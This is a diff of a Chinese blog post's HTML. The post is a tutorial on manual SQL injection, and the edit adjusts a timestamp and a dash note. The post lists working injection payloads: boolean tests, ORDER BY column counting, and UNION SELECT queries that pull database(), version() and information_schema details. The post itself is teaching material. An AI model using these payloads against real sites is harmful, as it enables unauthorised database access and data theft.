@@ -191,7 +191,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-03-13 00:29:04 / 修改时间：01:25:01" itemprop="dateCreated datePublished" datetime="2023-03-13T00:29:04+08:00">2023-03-13</time>
+      <time title="创建时间：2023-03-13 00:29:04 / 修改时间：01:28:54" itemprop="dateCreated datePublished" datetime="2023-03-13T00:29:04+08:00">2023-03-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -214,7 +214,7 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><p>手工注入：?id&#x3D;1 and 1&#x3D;1 跟?id&#x3D;1 and 1&#x3D;2前者页面正常回显后者不正常回显,则为数字型注入；<br>两者都是正常回显，注入?id&#x3D;1’发现页面报错，此题应该为字符型注入。<br>注入拼接字符串?id&#x3D;1’ and ‘1’&#x3D;’1和?id&#x3D;2’ and ‘1’&#x3D;’2前者页面正常回显后者不正常回显,则为字符型注入；</p>
-<h2 id="利用order-by确定列数"><a href="#利用order-by确定列数" class="headerlink" title="利用order by确定列数"></a>利用order by确定列数</h2><p>注入：<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 1—+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 2–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 3–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 4–+　　出现报错界面<br>则可确定列数为3</p>
+<h2 id="利用order-by确定列数"><a href="#利用order-by确定列数" class="headerlink" title="利用order by确定列数"></a>利用order by确定列数</h2><p>注入：<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 1–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 2–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 3–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 4–+　　出现报错界面<br><em>皆为两个-</em><br>则可确定列数为3</p>
 <h2 id="确认union查询是否有回显位"><a href="#确认union查询是否有回显位" class="headerlink" title="确认union查询是否有回显位"></a>确认union查询是否有回显位</h2><p>联合查询?id&#x3D;-1’ union select 1,2,3–<br><em>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</em></p>
 <h2 id="查询数据库和数据库版本信息"><a href="#查询数据库和数据库版本信息" class="headerlink" title="查询数据库和数据库版本信息"></a>查询数据库和数据库版本信息</h2><p>注入：?id&#x3D;-1’ union select 1,database(),version()–+<br><em>information_schema.tables:包含了数据库里所有的表<br>table_name:表名<br>table_schema:数据库名<br>column_name:字段名</em></p>
 <h2 id="相继爆破"><a href="#相继爆破" class="headerlink" title="相继爆破"></a>相继爆破</h2>
